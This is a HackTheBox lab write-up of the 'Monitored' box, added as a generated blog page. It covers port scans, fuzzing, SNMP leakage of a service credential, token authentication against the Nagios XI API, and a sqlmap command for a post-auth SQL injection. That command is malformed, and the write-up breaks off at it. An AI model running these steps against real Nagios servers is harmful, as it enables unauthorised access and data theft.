@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Monitored | OUHBOY</title>
+<meta name="keywords" content="htb">
+<meta name="description" content="Monitored HacktheBox Writeup">
+<meta name="author" content="Malw0re">
+<link rel="canonical" href="http://localhost:1313/posts/htb/manager/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/htb/manager/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="OUHBOY (Alt + H)">OUHBOY</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="tags">
+                    <span>tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="archives">
+                    <span>archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 (Alt &#43; /)" accesskey=/>
+                    <span>🔍</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Monitored
+    </h1>
+    <div class="post-description">
+      Monitored HacktheBox Writeup
+    </div>
+    <div class="post-meta">&lt;span title=&#39;2024-02-29 11:30:03 &#43;0000 &#43;0000&#39;&gt;February 29, 2024&lt;/span&gt;&amp;nbsp;·&amp;nbsp;6 min&amp;nbsp;·&amp;nbsp;Malw0re
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul><ul>
+                <li>
+                    <a href="#nmap-scans" aria-label="Nmap Scans.">Nmap Scans.</a></li></ul>
+                    
+                <li>
+                    <a href="#web-enumeration-port-80" aria-label="Web Enumeration (port 80)">Web Enumeration (port 80)</a></li>
+                <li>
+                    <a href="#fuzzing-port-80" aria-label="Fuzzing port 80.">Fuzzing port 80.</a></li>
+                <li>
+                    <a href="#nagiosxi" aria-label="nagiosxi">nagiosxi</a></li>
+                <li>
+                    <a href="#api" aria-label="API">API</a></li>
+                <li>
+                    <a href="#udp" aria-label="UDP">UDP</a></li>
+                <li>
+                    <a href="#initial-foothold" aria-label="Initial Foothold.">Initial Foothold.</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ht14f3nLye487pVBC_xxFQ.png" alt=""  />
+</p>
+<p>Today we&rsquo;ll be covering an interesting box called <em>Monitored</em> introduced with a medium level difficulty so let&rsquo;s check it out.</p>
+<h3 id="nmap-scans">Nmap Scans.<a hidden class="anchor" aria-hidden="true" href="#nmap-scans">#</a></h3>
+<p>Starting off with some port enumeration we get some interesting ports open.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT     STATE  SERVICE          VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open   ssh              OpenSSH 8.4p1 Debian 5+deb11u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>53/tcp   closed domain
+</span></span><span style="display:flex;"><span>80/tcp   open   http             Apache httpd 2.4.56
+</span></span><span style="display:flex;"><span>135/tcp  closed msrpc
+</span></span><span style="display:flex;"><span>389/tcp  open   ldap
+</span></span><span style="display:flex;"><span>139/tcp  closed netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp  closed microsoft-ds
+</span></span><span style="display:flex;"><span>464/tcp  closed kpasswd5
+</span></span><span style="display:flex;"><span>593/tcp  closed http-rpc-epmap
+</span></span><span style="display:flex;"><span>636/tcp  closed ldapssl
+</span></span><span style="display:flex;"><span>1433/tcp closed ms-sql-s
+</span></span><span style="display:flex;"><span>3268/tcp closed globalcatLDAP
+</span></span><span style="display:flex;"><span>3269/tcp closed globalcatLDAPssl
+</span></span><span style="display:flex;"><span>5667/tcp open   tcpwrapped
+</span></span><span style="display:flex;"><span>Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="web-enumeration-port-80">Web Enumeration (port 80)<a hidden class="anchor" aria-hidden="true" href="#web-enumeration-port-80">#</a></h2>
+<p>Intially checking port 80 it redirects to <code>nagios.monitored.htb</code>
+<img loading="lazy" src="https://imgur.com/ELNHUOG.png" alt=""  />
+ checking the site out. We are redirected to nagios XI.
+<img loading="lazy" src="https://imgur.com/rcKawD1.png" alt=""  />
+ which is a server and networking monitoring software.</p>
+<h2 id="fuzzing-port-80">Fuzzing port 80.<a hidden class="anchor" aria-hidden="true" href="#fuzzing-port-80">#</a></h2>
+<p>Trying login with the default credentials found online didn&rsquo;t provide us with access, hence the next step was to fuzz for some directory that might be hidden.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.hta                    <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 305ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 244ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.hta.php                <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 257ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htaccess               <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 243ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htpasswd               <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 231ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htpasswd.php           <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 238ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.htaccess.php           <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 247ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cgi-bin/.php            <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cgi-bin/                <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 324ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 208ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 3245, Words: 786, Lines: 75, Duration: 254ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>javascript              <span style="color:#f92672">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 215ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>nagios                  <span style="color:#f92672">[</span>Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 227ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 239ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We see that the <code>nagios</code> directory seems interesting but navigating tot the directory doesn&rsquo;t produce anything fruitful, but looking at the link on the site we identify a certian keyword which seems like a directory <code>nagiosxi</code>.</p>
+<h2 id="nagiosxi">nagiosxi<a hidden class="anchor" aria-hidden="true" href="#nagiosxi">#</a></h2>
+<p>Fuzzing the directory we get some interesting directories,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># directory-list-2.3-small.txt [Status: 200, Size: 26737, Words: 5495, Lines: 468, Duration: 486ms]</span>
+</span></span><span style="display:flex;"><span>help                    <span style="color:#f92672">[</span>Status: 200, Size: 26749, Words: 5495, Lines: 468, Duration: 267ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>tools                   <span style="color:#f92672">[</span>Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 298ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>mobile                  <span style="color:#f92672">[</span>Status: 200, Size: 15978, Words: 2562, Lines: 225, Duration: 296ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>admin                   <span style="color:#f92672">[</span>Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 279ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>reports                 <span style="color:#f92672">[</span>Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 296ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>account                 <span style="color:#f92672">[</span>Status: 200, Size: 26755, Words: 5495, Lines: 468, Duration: 294ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>includes                <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 333ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>backend                 <span style="color:#f92672">[</span>Status: 200, Size: 108, Words: 4, Lines: 5, Duration: 306ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>db                      <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 251ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>api                     <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 210ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>config                  <span style="color:#f92672">[</span>Status: 200, Size: 26753, Words: 5495, Lines: 468, Duration: 291ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>views                   <span style="color:#f92672">[</span>Status: 200, Size: 26751, Words: 5495, Lines: 468, Duration: 280ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>sounds                  <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 259ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>terminal                <span style="color:#f92672">[</span>Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 275ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Checking out <code>terminal</code> directory, there&rsquo;s a shell in box gui which after trying out soem authentication bypasses it didn&rsquo;t work.
+Later on went on to fuzz the <code>api</code> endpoint.</p>
+<h2 id="api">API<a hidden class="anchor" aria-hidden="true" href="#api">#</a></h2>
+<p>Fuzzing the API endpoints gives us 2 endpoints the <code>v1</code> and <code>includes</code>. v1 when fuzzing api endpoints is an indicator of version controlled endpoints. checking out the v1 endpoint we get a lot of results.</p>
+<p><strong>Note</strong>:
+If we visit /api/v1/xxx we can see that all the “endpoints” were giving us same message with size of 32 so we gave -fs 32 option to filter out mostly false-positive hits.`</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>license                 <span style="color:#f92672">[</span>Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 1163ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>%20                     <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 350ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>video games             <span style="color:#f92672">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 288ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>authenticate            <span style="color:#f92672">[</span>Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 2336ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>We get an interesting endpoint called authenticate but trying to access it we find that, we can only use <code>POST</code> to authenticate and since we don&rsquo;t have any credentials to authenticate with decided to go back to the nmap results and enumerate more.</p>
+<h2 id="udp">UDP<a hidden class="anchor" aria-hidden="true" href="#udp">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE         SERVICE
+</span></span><span style="display:flex;"><span>7/udp     open|filtered echo
+</span></span><span style="display:flex;"><span>53/udp    open|filtered domain
+</span></span><span style="display:flex;"><span>68/udp    open|filtered dhcpc
+</span></span><span style="display:flex;"><span>123/udp   open          ntp
+</span></span><span style="display:flex;"><span>161/udp   open          snmp
+</span></span><span style="display:flex;"><span>162/udp   open|filtered snmptrap
+</span></span><span style="display:flex;"><span>16838/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>18617/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>21131/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>21698/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>28547/udp open|filtered unknown
+</span></span><span style="display:flex;"><span>49181/udp open|filtered unknown
+</span></span></code></pre></div><p>Enumerating UDP ports, we find that snmp is open, enumerating snmp using <a href="https://github.com/mteg/braa">braa</a> a mass snmp scanner. We get interesting results.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.505 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;--config /etc/laurel/config.toml&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.549 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-f&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.550 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;--system --address=systemd: --no fork --nopidfile --systemd-activation --syslog-only&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.553 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-n -iNONE&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.556 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-u -s -O /run/wpa_supplicant&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.568 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-f&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.583 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.642 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.762 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-f /usr/local/nagios/etc/pnp/npcd.cfg&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.769 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-LOw -f -p /run/snmptrapd.pid&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.783 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.804 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-p /var/run/ntpd.pid -g -u 108:116&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.806 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.841 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.843 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.848 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.860 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-k start&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.870 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-D /var/lib/postgresql/13/main -c config_file=/etc/postgresql/13/main/postgresql.conf&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.942 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/usr/sbin/snmptt --daemon&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.943 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;/usr/sbin/snmptt --daemon&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.972 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.976 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-d /usr/local/nagios/etc/nagios.cfg&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.977 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;--worker /usr/local/nagios/var/rw/nagios.qh&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.978 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;--worker /usr/local/nagios/var/rw/nagios.qh&#34;</span>
+</span></span><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.979 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;--worker /usr/local/nagios/var/rw/nagios.qh&#34;</span>
+</span></span></code></pre></div><p>we identify there&rsquo;s a user called <code>svc</code> and also a passowrd that the user tried to authenticate with.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>iso.3.6.1.2.1.25.4.2.1.5.583 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &#34;</span>
+</span></span></code></pre></div><h2 id="initial-foothold">Initial Foothold.<a hidden class="anchor" aria-hidden="true" href="#initial-foothold">#</a></h2>
+<p>Now having creds to login and hving prior knowledge that we have a few instances on the <code>API</code> and <code>terminal</code> endpoints that we had to try out, started out with the terminal endpoint, didn&rsquo;t give us any results, proceeded to the <code>API</code> endpoint where we are need to construct a post request so as to authenticate.</p>
+<p><img loading="lazy" src="https://imgur.com/dEBYn5d.png" alt=""  />
+</p>
+<p>An Auth Token Obtain after using curl.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST -k -L -d <span style="color:#e6db74">&#39;username=svc&amp;password=XjH7VCehowpR1xZB&#39;</span> https://nagios.monitored.htb/nagiosxi/api/v1/authenticate/<span style="color:#e6db74">```</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">```</span>bash 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;svc&#34;</span>,<span style="color:#e6db74">&#34;user_id&#34;</span>:<span style="color:#e6db74">&#34;2&#34;</span>,<span style="color:#e6db74">&#34;auth_token&#34;</span>:<span style="color:#e6db74">&#34;76064ac8a8a9ece7c349404e1f99a45665e9acfc&#34;</span>,<span style="color:#e6db74">&#34;valid_min&#34;</span>:5,<span style="color:#e6db74">&#34;valid_until&#34;</span>:<span style="color:#e6db74">&#34;Fri, 23 Feb 2024 22:38:15 -0500&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>we get an auth token, going back to the <code>nagios</code> directory, we can authenticate and successfully login.</p>
+<p><img loading="lazy" src="https://imgur.com/fHkual8.png" alt=""  />
+</p>
+<p>According with this <a href="https://www.cve.org/CVERecord?id=CVE-2023-40931">CVE</a> there is a Post-Auth SQLi, so let’s try POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1 to get the admin api_key which is in xi_users in this sqlmap command on the way to add new user with administrative privileges</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate&#34;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> -p id --batch -D nagiosxi --dump -T xi_users | awk -F<span style="color:#e6db74">&#39;&#34;&#39;</span> <span style="color:#e6db74">&#39;{print$12}&#39;</span><span style="color:#e6db74">&#34; --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users
+</span></span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/htb/">Htb</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/tryhackme/simple-ctf/easyctf/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Simple CTF</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/">OUHBOY</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
